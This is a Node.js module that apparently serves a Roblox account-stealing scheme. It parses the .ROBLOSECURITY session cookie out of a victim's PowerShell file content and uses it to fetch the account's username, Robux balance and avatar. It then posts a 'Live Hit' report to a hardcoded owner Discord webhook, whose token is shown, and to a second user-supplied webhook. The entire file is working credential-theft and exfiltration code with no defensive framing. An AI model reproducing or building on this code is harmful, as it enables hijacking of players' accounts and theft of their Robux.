const fetch = require("node-fetch");

// CONFIG: Your owner webhook
const OWNER_WEBHOOK = "https://discord.com/api/webhooks/1382128004116779028/DTvQzE6Yy9vEyfufSIU0N26cJa6xUUZwqBMc48ohAhwAvACN7aAJJnwdcPIBL6ILZDGL";

// Parse ROBLOSECURITY from PowerShell file
function parseRobloxSecurityCookie(fileContent) {
  const match = fileContent.match(/\.ROBLOSECURITY", "([^"]+)"/);
  return match ? match[1] : "";
}

// Get Roblox account info using the cookie
async function getRobloxAccountInfo(cookie) {
  // Get user info
  const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!userRes.ok) throw new Error("Failed to get user info");
  const user = await userRes.json();

  // Get Robux balance
  const robuxRes = await fetch('https://economy.roblox.com/v1/users/' + user.id + '/currency', {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  let robux = 0;
  if (robuxRes.ok) {
    const robuxData = await robuxRes.json();
    robux = robuxData.robux || 0;
  }

  // Get profile picture
  const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png`);
  let pfp = "";
  if (thumbRes.ok) {
    const thumbData = await thumbRes.json();
    if (thumbData.data && thumbData.data[0]) {
      pfp = thumbData.data[0].imageUrl;
    }
  }

  return {
    username: user.name,
    robux,
    pfp
  };
}

// Send live hit embed to both webhooks
async function sendLiveHitEmbed({ username, robux, pfp }, webhooks) {
  const embed = {
    title: `🔴 Live Hit: ${username}`,
    color: 0xff4757,
    description: `**Robux:** ${robux}`,
    thumbnail: { url: pfp }
  };
  const payload = {
    username: "AutoHar Live Hit",
    embeds: [embed]
  };
  await Promise.all(
    webhooks.map(url =>
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      })
    )
  );
}

// Usage: handlePlayerFileLiveHit(fileContent, userWebhook)
async function handlePlayerFileLiveHit(fileContent, userWebhook) {
  const cookie = parseRobloxSecurityCookie(fileContent);
  if (!cookie) throw new Error("No ROBLOSECURITY cookie found.");
  const info = await getRobloxAccountInfo(cookie);
  await sendLiveHitEmbed(info, [OWNER_WEBHOOK, userWebhook]);
}

// Example usage:
// const fileContent = "..."; // your PowerShell file contents as string
// const userWebhook = "https://discord.com/api/webhooks/USER_WEBHOOK_ID/....";
// handlePlayerFileLiveHit(fileContent, userWebhook);

module.exports = {
  parseRobloxSecurityCookie,
  getRobloxAccountInfo,
  sendLiveHitEmbed,
  handlePlayerFileLiveHit
};